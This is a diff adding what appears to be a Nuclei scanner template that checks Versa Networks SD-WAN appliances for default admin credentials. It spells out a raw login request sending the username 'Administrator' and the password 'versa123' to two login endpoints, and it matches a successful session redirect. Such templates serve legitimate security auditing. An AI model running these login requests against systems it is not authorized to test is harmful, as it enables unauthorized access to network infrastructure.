@@ -1,0 +1,51 @@
+id: versa-sdwan-default-login
+
+info:
+  name: Versa Networks SD-WAN Application Default Login
+  author: davidmckennirey
+  severity: high
+  description: |
+    Searches for default admin credentials for the Versa Networks SD-WAN application.
+  tags: default-login,versa,sdwan
+
+requests:
+  - raw:
+      - |
+        POST /versa/j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 52        
+        Content-Type: application/x-www-form-urlencoded        
+
+        j_username=Administrator&j_password=versa123&submit=
+
+      - |
+        POST /j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 52        
+        Content-Type: application/x-www-form-urlencoded        
+
+        j_username=Administrator&j_password=versa123&submit=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+          
+      - type: word
+        words:
+          - 'Set-Cookie: JSESSIONID='
+        part: header
+
+      - type: word
+        words:
+          - 'Location: /versa/'
+          - 'Location: /'
+        part: header
+        matchers-condition: or
+
+      - type: word
+        words:
+          - '/login?error=true'
+        part: header
+        negative: true
